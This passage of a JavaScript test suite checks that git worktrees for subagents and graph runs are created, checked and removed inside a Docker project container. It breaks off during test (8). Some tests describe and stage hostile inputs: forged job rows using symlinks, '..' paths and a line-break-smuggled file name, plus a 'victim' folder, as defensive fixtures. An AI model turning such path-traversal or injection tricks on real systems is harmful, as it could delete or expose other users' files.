// Guard of the worktrees in the project container. Same tool as projectbox-git.test.js (part A): the fake docker (fake-docker.mjs)
// imitates `docker exec … cbase-wrapper … -- git …` against REAL git in throwaway repos; the `git` on the PATH
// (projectbox-git-scenario.mjs gitLocation) logs every call with its place — in the fake container the environment carries
// `IN_CONTAINER=container`, in B it is missing. This file imports no other test file.
//
// The promises, each with the way that breaks it:
//   (1) The worktree of a subagent is created WITH an instance in the project container (`gitFor` from the owner): `worktree add`
//       with the post-checkout hook only there, no git in B; unchanged it falls at the end of the turn with its branch, changed it
//       stays. WITHOUT an instance the core never asks `gitFor`, and everything runs in B as before, without docker.
//   (2) If the start is refused AFTER creating (cap), the fresh worktree goes back as a job — in the container.
//   (3) If the container is down at the end of the turn: no git in B, the job stands in `<data>/git-post-work/<p>.jsonl` (NOT in
//       the runtime folder), the worktree stays; the post-work (after the start) removes the unchanged one with its branch and
//       leaves the changed one.
//   (4) The graph worktree (workflows/worktree.js) with an instance: create, check, remove in the container; `force` removes no
//       changed one; if the container is down ⇒ `postWork`, afterwards in the container.
//   (5) The delete path (runs/agents.js cleanUpWorktreesInRuntimeFolder) with an instance: checked in the container, unchanged gone,
//       changed stays with a warning.
//   (6) GIT_TERMINAL_PROMPT=0 is already set in B — and still arrives as `-e GIT_TERMINAL_PROMPT` in the container.
//   (7) server.js: `git.path` at start only with the operation mark; after the transition to `ready` (atReady) the post-work runs;
//       the serverEnd hook waits for the open jobs BEFORE the stop chain halts the project containers — but at most its cap:
//       a hanging job does not hold the stop chain. The language servers (hook "language-service") end synchronously BEFORE the
//       stop chain.
//   (8)  the post-work file lies in no source of the mount rules; a foreign row (folder, link outside worktrees/, a symlink on the
//        way, `..`) deletes and releases nothing — it is dismissed, a correct one runs; a job outside the root is not even entered.
//   (9)  project switch A → B (B converted) in the middle of a turn, then a worktree start ⇒ the repo of the CORE (A), no worktree
//        from the repo of B.
//   (10) openGitJobsUntil waits at most the cap (0 = not at all) and reports that it applied.
//   (11) an open git job of the project is open work for projectIdle — for the main, never for a copy (instanceIdle); a job IN a
//        copy counts for that copy (copy-worktrees.test.js).
//   (12) "is restarting" and "is paused" mean "down" — the job goes to the post-work, the worktree does not count as changed.
//        "is paused" is a word of its own (`containerPaused` — wait, do not wake); the post-work takes both.
//   (13) git.path into a symlink writes to its target (the link stays), a dangling link is not replaced, a foreign git.path is
//        reported with its old value.
//   The fake docker shares the disk with B — what THIS process touches is measured with a spy on `fs`:
//   (14a) copies, links and `info/exclude` of a graph worktree arise with an instance in the project container (ONE `node -e`), the
//         removal (links released by `sh -c`, run folder `rm -rf --`) likewise — B writes neither in the repo nor in the worktree.
//   (14b) `--git-path info/exclude` steered to a file in B: B never opens it.
//   (14c) a name with a line break from `ls-files`: no row from it, it drops out in B and is reported.
//   (14d) `--show-toplevel` bent to a foreign repo in B: B does not read its `.env` and copies nothing.
//   (15)  the worktree of a subagent creates no folder in B with an instance (root, place from show-toplevel).
//   (16)  the choice of the repo of a subagent (providers/agent-runtime.js selectRepo) with an instance: B reads `.git/config`
//         neither in the working folder nor in a candidate (a FIFO there would stop the event loop, a link would read a file of B) —
//         the mark of the project repo comes from `git config --local --type=bool --get cbase.projectRepo` IN the container; the
//         worktree arises from the code repo, never from the project repo. Without an instance today's call (B reads the file).
//   (17)  the worktree of a subagent fetches its LFS files IN the container with an instance (runs/git-post-work.js lfsInWorktree via
//         `gitFor(...).lfs`) — the model sees the content, no pointer; a repo without an LFS file asks no `lfs pull`; without an
//         instance no git-lfs.
//   (17b) if the LFS fetch in the worktree fails (`lfsFails`), the worktree arises anyway, the subagent starts in it and sees the
//         pointer; the reason stands in the log. Without git-lfs in the container a repo with `filter=lfs` arises just as intact
//         (lfsFetch asks `ls-files :(attr:filter=lfs)`), and gitPull with an instance throws named after the pull — state, pointer
//         and working tree unchanged; a repo without `filter=lfs` is `{ ok: true }` without git-lfs.
//
// COUNTER-TESTS (each shown red, taken back): agent-runtime.js from before part B ⇒ (1) (2) (3) red (the worktree arises in B);
// workflows/worktree.js from before ⇒ (4) red; runs/agents.js without the instance branch in the delete path ⇒ (5) red;
// runtime/git-run.js and runtime/inProject.js from before ⇒ (6) red (the name is missing in argv, GIT_TERMINAL_PROMPT is empty in
// the container); server.js without the line `enterGitPath` at start ⇒ (7) red, without `atReady(… gitPostWork …)` ⇒ (7) red,
// without the hook "git-jobs" ⇒ (7) red; git-post-work.js without the check (like a `force`) ⇒ (1) (3) (4) (5) red;
// git-post-work.js with the file in the runtime mount ⇒ (3) (8) (10) (11) red; only the check removed ⇒ (8) red (the victim folder
// outside is gone, `removed: 5`); only the old place ⇒ (3) (8) red; repoCandidates as before ⇒ (9) red (worktree from the repo of
// B, git in B); `fromCore` always true ⇒ (9) red in the G2 round; server.js with the old hook without a cap ⇒ (7) red (the hook
// waited for the hanging job); the old pattern in runtime/git-run.js ⇒ (12) red, also the way alone (`changed: true`, no
// post-work); vscode-tunnel.js from before ⇒ (13) red; projectbox/idle.js without the line "git" ⇒ (11) red;
// workflows/worktree.js from before ⇒ (14a) (14b) (14c) (14d) red; git-post-work.js with links and folders in B ⇒ (14a) red;
// agent-runtime.js from before ⇒ (15) red; without the name check ⇒ (14c) red (the smuggled-in row stands in the victim file);
// the mkdir only without a worktree root ⇒ (15) red at the place from show-toplevel; agent-runtime.js before the repair of selectRepo
// ⇒ (16) red (B read `.git/config` of the project repo, no config call in the container); agent-runtime.js without the line
// `kg.lfs(dir)` ⇒ (17) red; agent-runtime.js throwing if `kg.lfs` does not report `ok` ⇒ (17b) red ("batch response: Repository
// or object not found" instead of the start); git.js gitPull with `if (false)` instead of `if (instance)` before lfsFetch ⇒ (17b) red
// ("Missing expected rejection"). Also in-project-start-places.test.js with agent-runtime.js or workflows/worktree.js from before
// ⇒ (A1) (A2) (E1) (E2) red.
//
// No clock: waiting is for process ends, for `openGitJobs()` and for states (waitForTruthy without a deadline).
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import fs from "node:fs";
import path from "node:path";
import test from "node:test";

import * as store from "../electron/server/store.js";
import * as gitModule from "../electron/server/git.js";
import { DIRS, setDirs } from "../electron/server/app-state.js";
import { createAgentRuntime } from "../electron/server/providers/agent-runtime.js";
import { gitInProject, gitPostWork, withOpen, postWorkFile, openGitJobs, openGitJobsUntil, openGitJobsOf, worktreeTeardown } from "../electron/server/runs/git-post-work.js";
import { cleanUpWorktreesInRuntimeFolder } from "../electron/server/runs/agents.js";
import { setInstanceSource } from "../electron/server/runs/instance.js";
import { locationFor } from "../electron/server/runs/runtime-location.js";
import { observeHooks, fireHooks } from "../electron/server/runs/hooks.js";
import { containerPaused, containerStands, gitRun } from "../electron/server/runtime/git-run.js";
import { openEscalations, setInProjectSeam } from "../electron/server/runtime/inProject.js";
import { mountRules } from "../electron/server/projectbox/creation.js";
import { dockerKind, dockerProgram } from "../electron/server/projectbox/docker.js";
import { runInstance } from "../electron/server/projectbox/run-instance.js";
import { instanceIdle, projectIdle } from "../electron/server/projectbox/idle.js";
import { desiredFromInspect } from "../electron/server/projectbox/serverEnd.js";
import { atReady, restoreInstance } from "../electron/server/projectbox/restore.js";
import { enterGitPath } from "../electron/server/vscode-tunnel.js";
import { removeGraphWorktree, graphWorktreeChanged, createGraphWorktree } from "../electron/server/workflows/worktree.js";
import { fakeClaude, json, withAgentsServer, waitForTruthy } from "./agent-harness.mjs";
import { fakeDocker } from "./fake-docker.mjs";
import { fakeLfs, lfsCalls, lfsFails, pointer } from "./fake-lfs.mjs";
import { realGit, gitLocation, readLog, createRepo } from "./projectbox-git-scenario.mjs";
import { withOps, scenario } from "./projectbox-scenario.mjs";

// ── Helpers (built like projectbox-git.test.js — a test file imports no other) ─────────────────────────────────────
async function withEnvironment(values, fn) {
  const saved = Object.fromEntries(Object.keys(values).map((k) => [k, process.env[k]]));
  try {
    for (const [k, v] of Object.entries(values)) { if (v === undefined) delete process.env[k]; else process.env[k] = v; }
    return await fn();
  } finally {
    for (const [k, v] of Object.entries(saved)) { if (v === undefined) delete process.env[k]; else process.env[k] = v; }
  }
}
const ops = (fd) => ({ CBASE_CONTAINER: "1", CBASE_DIND: "1", CBASE_DOCKER_BIN: fd.bin, CBASE_IN_PROJECT_ESCALATION_MS: "200", GIT_TERMINAL_PROMPT: undefined });
const unitSeam = (location) => ({ kind: dockerKind, program: dockerProgram, processLocation: () => location, container: (i) => i.containerId });
const INST = (name) => ({ projectId: "p1", instance: "main", identifier: "p1/main", containerId: name });
const dockerDo = (fd, ...args) => execFileSync(fd.bin, args, { env: { ...process.env, ...fd.env }, encoding: "utf8" }).trim();
const callsValue = (o) => readLog(o.log).filter((e) => !e.step);
const inB = (o) => callsValue(o).filter((a) => a.where !== "container").map((a) => `${a.cwd}: git ${a.argv.join(" ")}`);
const has = (o, ...part) => callsValue(o).some((a) => a.where === "container" && part.every((t, i) => a.argv[i] === t));
const branches = (repo, env) => realGit(repo, ["branch", "--list", "--format=%(refname:short)"], env).split("\n").filter(Boolean);
const hookScript = (marker, name) => `#!/bin/sh\nprintf '%s %s\\n' "\${IN_CONTAINER:-B}" '${name}' >> '${marker}'\n`;
const readMarker = (marker) => (fs.existsSync(marker) ? fs.readFileSync(marker, "utf8").split("\n").filter(Boolean) : []);

// The unit: fake docker, a running project container with the environment of the container place, the seam, B environment,
// an own data folder (the runtime folder of the project lies below it) and the instance source for p1.
async function unit(fn, { docker = {} } = {}) {
  const fd = await fakeDocker(docker);
  const o = gitLocation("cbase-gitwt-");
  const name = `cbase-p-${path.basename(o.location).replace(/[^a-z0-9]/gi, "").toLowerCase()}`;
  const savedDirs = DIRS;
  try {
    return await withEnvironment({ ...o.env, ...ops(fd) }, async () => {
      dockerDo(fd, "run", "-d", "--name", name, ...Object.entries(o.containerEnv).flatMap(([k, v]) => ["-e", `${k}=${v}`]), "cbase-projectbox:test");
      setInProjectSeam(unitSeam(path.join(o.location, "processes")));
      const data = path.join(o.location, "data");
      setDirs({ ...(savedDirs || {}), data, scratch: path.join(data, "scratch"), attachments: path.join(data, "attachments"), outputs: path.join(data, "outputs") });
      const inst = INST(name);
      setInstanceSource((pid) => (pid === "p1" ? inst : null));
      const r = await fn({ fd, o, name, inst });
      await openGitJobs();
      await waitForTruthy(() => openEscalations() === 0, "escalations done");
      return r;
    });
  } finally {
    setInstanceSource(null);
    setDirs(savedDirs);
    setInProjectSeam(null);
    fd.cleanUp();
    fs.rmSync(o.location, { recursive: true, force: true });
  }
}

// A core (providers/agent-runtime.js) with a fake dispatcher: `tun(spec)` runs in the turn of the subagent.
function core({ cwd, instance = null, gitFor, worktreeRoot, slotMissing, repoCandidates, tun = () => {} }) {
  const calls = [];
  const rt = createAgentRuntime({
    chatId: "chat-wt", cwd, parentProvider: "third",
    agentDefs: () => [],
    hosts: () => [{ id: "third", label: "third", models: [{ id: "mini", label: "mini" }] }],
    resolveRef: () => ({ providerId: "third", connector: { id: "third" }, model: "mini", unknownProvider: false }),
    resolveSkills: () => ({ skills: [], missing: [], available: [] }),
    buildSpec: (o) => ({ ...o }),
    runChat: async ({ spec, onEvent, onSpawn }) => {
      calls.push(spec);
      onSpawn?.({ kill: () => {}, cbaseEndInput: () => {} });
      await tun(spec);
      onEvent({ type: "result", result: "finished", session_id: `s-${calls.length}` });
      return { code: 0, sessionId: `s-${calls.length}`, resultText: "finished", stderr: "" };
    },
    onEvent: () => {},
    worktreeRoot,
    instance,
    gitFor,
    ...(slotMissing ? { slotMissing } : {}),
    ...(repoCandidates ? { repoCandidates } : {}),
  });
  return { rt, calls };
}
const START = { run_in_background: false, prompt: "Subtask", model: "third::mini", isolation: "worktree" };

// ── (1) Subagent ─────────────────────────────────────────────────────────────────────────────────────────────────────
test("(1) subagent with an instance: worktree in the project container (hook only there), unchanged gone with its branch, changed stays; without an instance as before", async () => {
  await unit(async ({ fd, o, inst }) => {
    const K = path.join(o.location, "proj", "till");
    createRepo(K, o.env);
    const marker = path.join(o.location, "hook.marker");
    fs.writeFileSync(path.join(K, ".git", "hooks", "post-checkout"), hookScript(marker, "post-checkout"), { mode: 0o755 });
    const asked = [];
    const gitFor = (k) => { asked.push(k); return k === "p1/main" ? gitInProject(inst) : null; };
    let change = false;
    const { rt, calls } = core({ cwd: K, instance: "p1/main", gitFor, worktreeRoot: path.join(o.location, "wt"), tun: (spec) => { if (change) fs.writeFileSync(path.join(spec.cwd, "fresh.txt"), "work\n"); } });
    fs.writeFileSync(o.log, "");
    const a = await rt.start(START);
    const dirA = calls[0].cwd;
    assert.match(path.basename(dirA), /^agent-/);
    assert.equal(a.worktree, "", "unchanged: not in the report");
    assert.equal(fs.existsSync(dirA), false, "unchanged: gone");
    assert.deepEqual(branches(K, o.env), ["main"], "unchanged: the branch goes with it");
    assert.deepEqual(readMarker(marker), ["container post-checkout"], "the hook of the code repo ran only in the container");
    assert.ok(has(o, "worktree", "add") && has(o, "worktree", "remove"), JSON.stringify(callsValue(o)).slice(0, 600));
    assert.deepEqual(inB(o), [], "no git in B");
    assert.ok(asked.length > 0 && asked.every((k) => k === "p1/main"));

    change = true;
    const b = await rt.start(START);
    const dirB = calls[1].cwd;
    assert.equal(b.worktree, dirB, "changed: in the report");
    assert.ok(fs.existsSync(path.join(dirB, "fresh.txt")), "changed: stays");
    assert.ok(branches(K, o.env).some((z) => z.startsWith("cbase/agent-")), "changed: the branch stays");
    assert.deepEqual(inB(o), []);

    // Without an instance: gitFor is never asked, no docker, the worktree arises in B.
    const prior = { asked: asked.length, docker: fd.calls().length };
    const without = core({ cwd: K, gitFor, worktreeRoot: path.join(o.location, "wt-b") });
    fs.writeFileSync(o.log, "");
    const c = await without.rt.start(START);
    assert.equal(c.worktree, "");
    assert.equal(asked.length, prior.asked, "without an instance the core never asks gitFor");
    assert.equal(fd.calls().length, prior.docker, "without an instance no docker (G2)");
    assert.ok(callsValue(o).length > 0 && callsValue(o).every((x) => x.where === "B"), "without an instance: git in B as before");
    await rt.close?.();
    await without.rt.close?.();
  });
});

// ── (2) Start refused ───────────────────────────────────────────────────────────────────────────────────────────────
test("(2) start refused after creating (cap): the fresh worktree goes back as a job, in the container", async () => {
  await unit(async ({ o, inst }) => {
    const K = path.join(o.location, "proj", "till");
    createRepo(K, o.env);
    const root = path.join(o.location, "wt");
    const { rt, calls } = core({ cwd: K, instance: "p1/main", gitFor: () => gitInProject(inst), worktreeRoot: root, slotMissing: () => "Cap reached: 20 subagents running" });
    fs.writeFileSync(o.log, "");
    await assert.rejects(rt.start(START), /Cap reached/);
    await openGitJobs();
    assert.equal(calls.length, 0, "nothing started");
    assert.ok(has(o, "worktree", "add"), "it was created — in the container");
    assert.ok(has(o, "worktree", "remove"), "and went back — in the container");
    assert.deepEqual(fs.existsSync(root) ? fs.readdirSync(root) : [], []);
    assert.deepEqual(branches(K, o.env), ["main"]);
    assert.deepEqual(inB(o), []);
    await rt.close?.();
  });
});

// ── (3) Container down ──────────────────────────────────────────────────────────────────────────────────────────────
test("(3) container down at the end of the turn: post-work instead of git in B; after the start in the container — unchanged gone, changed stays", async () => {
  await unit(async ({ fd, o, name, inst }) => {
    const K = path.join(o.location, "proj", "till");
    createRepo(K, o.env);
    let change = false;
    // The worktree root of the runtime folder, as in the product (runs/agents.js worktreeRoot(runLocation)) — the post-work only
    // enters jobs below it.
    const location = locationFor({ projectId: "p1", converted: true });
    const { rt, calls } = core({ cwd: K, instance: "p1/main", gitFor: () => gitInProject(inst), worktreeRoot: location.worktrees, tun: (spec) => {
      if (change) fs.writeFileSync(path.join(spec.cwd, "fresh.txt"), "work\n");
      dockerDo(fd, "stop", name); // the container stops in the middle of the turn
    } });
    fs.writeFileSync(o.log, "");
    const a = await rt.start(START);
    const dirA = calls[0].cwd;
    assert.equal(a.worktree, dirA, "the worktree stays for now");
    assert.ok(fs.existsSync(dirA));
    const file = postWorkFile("p1");
    assert.equal(path.relative(location.root, file).split(path.sep)[0], "..", `NOT in the runtime folder of the project: ${file}`);
    const rows = () => fs.readFileSync(file, "utf8").split("\n").filter(Boolean).map((z) => JSON.parse(z));
    assert.deepEqual(rows().map((z) => z.worktrees.map((w) => w.dir)), [[dirA]]);
    assert.equal(rows()[0].worktrees[0].deleteBranch, true);

    dockerDo(fd, "start", name);
    change = true;
    const b = await rt.start(START);
    const dirB = calls[1].cwd;
    assert.equal(b.worktree, dirB);
    assert.deepEqual(rows().map((z) => z.worktrees[0].dir), [dirA, dirB]);
    assert.deepEqual(inB(o), [], "no git in B, not even at the standing container");

    dockerDo(fd, "start", name);
    const r = await gitPostWork(inst);
    assert.deepEqual({ read: r.read, removed: r.removed, changed: r.changed, again: r.again, error: r.error }, { read: 2, removed: 1, changed: 1, again: 0, error: [] });
    assert.equal(fs.existsSync(dirA), false, "the unchanged one is gone");
    assert.ok(fs.existsSync(path.join(dirB, "fresh.txt")), "the changed one stays");
    const z = branches(K, o.env);
    assert.equal(z.length, 2, `only the branch of the changed one stays: ${z}`);
    assert.equal(fs.existsSync(file) || fs.existsSync(`${file}.running`), false, "done is done");
    assert.deepEqual(inB(o), []);
    await rt.close?.();
  });
});

// ── (4) Graph worktree ───────────────────────────────────────────────────────────────────────────────────────────────
test("(4) graph worktree with an instance: create, check, remove in the container; force removes no changed one; down ⇒ post-work", async () => {
  await unit(async ({ fd, o, name, inst }) => {
    const K = path.join(o.location, "proj", "till");
    createRepo(K, o.env);
    const marker = path.join(o.location, "hook.marker");
    fs.writeFileSync(path.join(K, ".git", "hooks", "post-checkout"), hookScript(marker, "post-checkout"), { mode: 0o755 });
    const project = { id: "p1", name: "Till", path: K };
    const root = locationFor({ projectId: "p1", converted: true }).worktrees; // as in the product (the post-work checks it)
    fs.writeFileSync(o.log, "");
    const info = await createGraphWorktree({ startId: "abcdef1234567890", project, root });
    assert.equal(info.projectId, "p1", "info carries the project (removing and checking ask the instance with it)");
    assert.deepEqual(readMarker(marker), ["container post-checkout"]);
    assert.equal(await graphWorktreeChanged(info), false);
    fs.writeFileSync(path.join(info.dir, "fresh.txt"), "work\n");
    assert.equal(await graphWorktreeChanged(info), true);
    const withForce = await removeGraphWorktree(info, { force: true });
    assert.deepEqual(withForce, { removed: false, changed: true, error: [] }, "force removes no changed one (contract)");
    assert.ok(fs.existsSync(path.join(info.dir, "fresh.txt")));
    fs.rmSync(path.join(info.dir, "fresh.txt"));
    assert.deepEqual(await removeGraphWorktree(info), { removed: true, changed: false, error: [] });
    assert.equal(fs.existsSync(info.dir), false);
    assert.deepEqual(branches(K, o.env), ["main"]);
    assert.deepEqual(inB(o), [], "no git in B");

    // Container down: post-work, the folder stays; after the start gone in the container.
    const info2 = await createGraphWorktree({ startId: "1234567890abcdef", project, root });
    dockerDo(fd, "stop", name);
    const way = await removeGraphWorktree(info2, { force: true });
    assert.deepEqual(way, { removed: false, changed: false, error: [], postWork: true });
    assert.ok(fs.existsSync(info2.dir));
    dockerDo(fd, "start", name);
    const r = await gitPostWork(inst);
    assert.equal(r.removed, 1, JSON.stringify(r));
    assert.equal(fs.existsSync(info2.dir), false, "the run folder is gone");
    assert.deepEqual(branches(K, o.env), ["main"]);
    assert.deepEqual(inB(o), []);
  });
});

// ── (5) Delete path ─────────────────────────────────────────────────────────────────────────────────────────────────────
test("(5) delete path with an instance: checked in the container, unchanged gone, changed stays with a warning — no git in B", async () => {
  await unit(async ({ o }) => {
    const K = path.join(o.location, "proj", "till");
    createRepo(K, o.env);
    const location = locationFor({ projectId: "p1", converted: true });
    fs.mkdirSync(location.worktrees, { recursive: true });
    const d1 = path.join(location.worktrees, "agent-a1");
    const d2 = path.join(location.worktrees, "agent-a2");
    realGit(K, ["worktree", "add", "-q", "-b", "cbase/agent-a1", d1, "HEAD"], o.env);
    realGit(K, ["worktree", "add", "-q", "-b", "cbase/agent-a2", d2, "HEAD"], o.env);
    fs.writeFileSync(path.join(d2, "fresh.txt"), "work\n");
    fs.writeFileSync(o.log, "");
    const warn = [];
    const immediately = cleanUpWorktreesInRuntimeFolder("chat-x", () => [{ dir: d1, repo: K, agentId: "a1" }, { dir: d2, repo: K, agentId: "a2" }], { warn: (w) => warn.push(w) });
    assert.deepEqual(immediately, [], "the closing path does not wait for docker");
    await openGitJobs();
    assert.equal(fs.existsSync(d1), false, "unchanged: gone");
    assert.ok(fs.existsSync(path.join(d2, "fresh.txt")), "changed: stays");
    assert.ok(warn.some((w) => w.includes("with changes stays") && w.includes(d2)), JSON.stringify(warn));
    assert.ok(has(o, "worktree", "remove"));
    assert.deepEqual(inB(o), [], "no git in B");
  });
});

// ── (6) GIT_TERMINAL_PROMPT ──────────────────────────────────────────────────────────────────────────────────────────
test("(6) GIT_TERMINAL_PROMPT=0 already in B: arrives anyway as -e GIT_TERMINAL_PROMPT (without a value) in the container", async () => {
  await unit(async ({ fd, o, inst }) => {
    const K = path.join(o.location, "proj", "till");
    createRepo(K, o.env);
    await withEnvironment({ GIT_TERMINAL_PROMPT: "0" }, async () => {
      fs.writeFileSync(o.log, "");
      const prior = fd.calls({ daemon: "host" }).length;
      const r = await gitRun(inst, K, ["status", "--porcelain"], { fallback: () => { throw new Error("with an instance never the fallback"); } });
      assert.equal(r.code, 0, r.stderr);
      const exec = fd.calls({ daemon: "host" }).slice(prior).filter((a) => a.args[0] === "exec");
      assert.equal(exec.length, 1);
      const i = exec[0].args.indexOf("GIT_TERMINAL_PROMPT");
      assert.ok(i > 0 && exec[0].args[i - 1] === "-e", `-e GIT_TERMINAL_PROMPT missing: ${exec[0].args.join(" ")}`);
      assert.ok(!exec[0].args.some((x) => x.startsWith("GIT_TERMINAL_PROMPT=")), "only the name (G5)");
      const [a] = callsValue(o);
      assert.equal(a.where, "container");
      assert.equal(a.prompt, "0", "in the container GIT_TERMINAL_PROMPT=0 is set");
    });
  });
});

// ── (7) server.js ────────────────────────────────────────────────────────────────────────────────────────────────────
test("(7) server.js: git.path at start only with the operation mark; atReady ⇒ post-work; serverEnd waits for the jobs before the stop", async () => {
  const fd0 = await fakeDocker();
  const o = gitLocation("cbase-gitwt-srv-");
  const wrapper = path.join(o.location, "cbase-git");
  fs.writeFileSync(wrapper, "#!/bin/sh\n", { mode: 0o755 });
  const withoutFile = path.join(o.location, "vs-without", "Machine", "settings.json");
  const withFile = path.join(o.location, "vs-with", "Machine", "settings.json");
  let fd = null;
  try {
    // Without the operation mark the start writes no VS Code setting (G1).
    await withEnvironment({ ...o.env, CBASE_CONTAINER: undefined, CBASE_DIND: undefined, CBASE_DOCKER_BIN: fd0.bin, CBASE_VSCODE_MACHINE: withoutFile, CBASE_GIT_WRAPPER: wrapper },
      () => withAgentsServer(async () => {}));
    assert.equal(fs.existsSync(withoutFile), false, "without the operation mark no git.path");

    await withEnvironment({ ...o.env, ...ops(fd0), CBASE_VSCODE_MACHINE: withFile, CBASE_GIT_WRAPPER: wrapper }, () => withAgentsServer(async (ctx) => {
      assert.deepEqual(JSON.parse(fs.readFileSync(withFile, "utf8")), { "git.path": wrapper }, "with the operation mark: git.path at start, without a tunnel");

      // atReady ⇒ post-work: a job that found the container down runs in the container after the restoration.
      const s = scenario(ctx);
      fd = await fakeDocker({ programs: s.programs });
      await withEnvironment({ CBASE_PROJECT_STAGE_MS: "3600000", CBASE_NETWORK_ROOT: s.root }, () => withOps(fd, async () => {
        const name = `cbase-p-${s.projectId}`;
        const cid = dockerDo(fd, "run", "-d", "--name", name, "--label", `cbase.project=${s.projectId}`, "cbase-projectbox:latest");
        store.createProjectInstance({ projectId: s.projectId, state: "ready", convertedAt: Date.now(), containerId: cid, desired: desiredFromInspect([]) });
        dockerDo(fd, "stop", name);
        for (const f of fs.readdirSync(path.join(fd.dir, "gates"))) if (f.endsWith(".waiting")) fs.rmSync(path.join(fd.dir, "gates", f));
        const repo = path.join(s.path, "repo");
        createRepo(repo, o.env);
        const base = realGit(repo, ["rev-parse", "HEAD"], o.env).trim();
        const dir = path.join(s.location.worktrees, "agent-srv");
        realGit(repo, ["worktree", "add", "-q", "-b", "cbase/agent-srv", dir, "HEAD"], o.env);
        const job = { who: "Test", worktrees: [{ repo, dir, branch: "cbase/agent-srv", base, deleteBranch: true }] };
        const r = await worktreeTeardown(runInstance(s.projectId), job);
        assert.equal(r.postWork, true, JSON.stringify(r));
        assert.ok(fs.existsSync(postWorkFile(s.projectId)));
        // The callbacks run in the order of their registration in ONE tick: this one (registered after the one of server.js)
        // already sees the post-work job in `open` — it waits for it, not for the folder (no hang if the hook is missing).
        const reported = new Promise((resolve) => { const barrier = atReady(() => { barrier(); resolve(); }); });
        const row = await restoreInstance(s.projectId, "main", { reason: "Test" });
        assert.equal(row.state, "ready", row.error);
        await reported;
        await openGitJobs();
        assert.equal(fs.existsSync(dir), false, "the post-work ran after the transition to ready");
        assert.deepEqual(branches(repo, o.env), ["main"], "with its branch");
        assert.equal(fs.existsSync(postWorkFile(s.projectId)), false);

        // serverEnd: an open job runs to its end BEFORE the stop chain halts the container.
        const dir2 = path.join(s.location.worktrees, "agent-srv2");
        realGit(repo, ["worktree", "add", "-q", "-b", "cbase/agent-srv2", dir2, "HEAD"], o.env);
        const followUp = [];
        // The promise is for the sequence git-jobs → projectbox. The hook "language-service" (lsp/sessions.js) stands deliberately
        // BEFORE it: synchronous, waits for nothing, and a language server in the project container thus ends before the
        // `docker stop` instead of crashing in the middle of it — it does not shift the jobs. So the sequence is counted WITHOUT it,
        // and that it ran before the stop chain is a check of its own (`slice(0, 3)` would see "language-service start" first).
        // The same for the hook "own-browsers" (browsers.js closeAllUserBrowsers): it ends the own browsers before the stop chain takes
        // the project containers — not part of the jobs' sequence, its place before "projectbox start" is checked below.
        const stopChain = (f) => f.filter((x) => !x.startsWith("language-service ") && !x.startsWith("own-browsers ")).slice(0, 3);
        observeHooks((e) => { if (e.kind === "serverEnd") followUp.push(`${e.name} ${e.phase}`); });
        try {
          const open = worktreeTeardown(runInstance(s.projectId), { who: "Test", worktrees: [{ repo, dir: dir2, branch: "cbase/agent-srv2", base, deleteBranch: true }] });
          let finished = null;
          open.then((x) => { finished = { ...x, projectboxAlready: followUp.includes("projectbox start") }; });
          await fireHooks("serverEnd", {});
          assert.ok(finished, "the job was finished when the hooks returned");
          assert.equal(finished.removed, true, JSON.stringify(finished));
          assert.equal(finished.projectboxAlready, false, `the job ended before the stop chain: ${followUp.join(", ")}`);
          assert.deepEqual(stopChain(followUp), ["git-jobs start", "git-jobs end", "projectbox start"]);
          assert.ok(followUp.indexOf("language-service start") >= 0 && followUp.indexOf("language-service start") < followUp.indexOf("projectbox start"), `the language servers did not end before the stop chain: ${followUp.join(", ")}`);
          assert.ok(followUp.indexOf("own-browsers end") >= 0 && followUp.indexOf("own-browsers end") < followUp.indexOf("projectbox start"), `the own browsers did not end before the stop chain: ${followUp.join(", ")}`);
          assert.equal(fs.existsSync(dir2), false);
          assert.equal(fd.state().container[cid]?.status ?? Object.values(fd.state().container).find((c) => c.name === name)?.status, "exited", "afterwards the stop chain halted it");
        } finally {
          observeHooks(null);
        }

        // A HANGING job does not hold the stop chain — the hook waits at most its cap (here 0 = not at all). The job releases only
        // in the next tick after the hook started (setImmediate): with a cap the hook is already finished then, without (the old
        // hook waited for all open git jobs) it ends only afterwards. No clock as verdict.
        let go = null;
        let done = false;
        const hangs = withOpen(new Promise((resolve) => { go = resolve; })).then(() => { done = true; });
        const followUp2 = [];
        let atEnd = null;
        observeHooks((e) => {
          if (e.kind !== "serverEnd") return;
          followUp2.push(`${e.name} ${e.phase}`);
          if (e.name === "git-jobs" && e.phase === "start") setImmediate(() => go());
          if (e.name === "git-jobs" && e.phase === "end") atEnd = done;
        });
        try {
          await withEnvironment({ CBASE_GIT_END_MS: "0" }, () => fireHooks("serverEnd", {}));
        } finally {
          observeHooks(null);
          go?.();
        }
        await hangs;
        assert.equal(atEnd, false, "the hook ended while the job was still hanging (its cap applied)");
        assert.deepEqual(stopChain(followUp2), ["git-jobs start", "git-jobs end", "projectbox start"]);
      }));
    }));
  } finally {
    fd?.cleanUp();
    fd0.cleanUp();
    fs.rmSync(o.location, { recursive: true, force: true });
  }
});

// ── Post-work file, project switch, caps ───────────────────────────────────────────────────────────────────────────────
// Does `p` lie in (or is it) `q`?
const contains = (q, p) => {
  const r = path.relative(q, p);
  return r === "" || (r.split(path.sep)[0] !== ".." && !path.isAbsolute(r));
};

// ── (8) the post-work file ─────────────────────────────────────────────────────────────────────────────
test("(8) post-work: the file hangs in no project container; a foreign row deletes and releases nothing outside worktrees/", async () => {
  await unit(async ({ fd, o, name, inst }) => {
    const location = locationFor({ projectId: "p1", converted: true });
    const file = postWorkFile("p1");
    // 1. The place: no source (and no target) of the mount rules contains it — with the home as ancestor of <data> as in B
    //    (/home/agent ⊃ /home/agent/cbase/data), with the exception table and the runtime folder of the project.
    const rules = mountRules({ home: o.location, wsPath: path.join(o.location, "ws"), projectPath: path.join(o.location, "proj"), runtime: location.root });
    assert.ok(rules.some((r) => r.rule === "runtime"), "the rule \"runtime\" is in the table");
    for (const r of rules) {
      for (const d of [file, `${file}.running`]) {
        assert.equal(contains(r.source, d) || contains(r.target, d), false, `${d} lies in the mount "${r.rule}" (${r.source}) — a project container could write rows that B executes`);
      }
    }

    // 2. Foreign rows (as anyone who reaches the file could write them): dismissed, nothing executed.
    const victim = path.join(DIRS.data, "victim");
    fs.mkdirSync(victim, { recursive: true });
    fs.writeFileSync(path.join(victim, "important.db"), "DB\n");
    const victimLink = path.join(DIRS.data, "victim-link");
    fs.symlinkSync(victim, victimLink);
    fs.mkdirSync(location.scratch, { recursive: true });
    fs.writeFileSync(path.join(location.scratch, "stays.txt"), "x\n");
    fs.mkdirSync(path.join(location.worktrees, "k"), { recursive: true });
    const outsideD = path.join(o.location, "outside-d");
    fs.mkdirSync(outsideD);
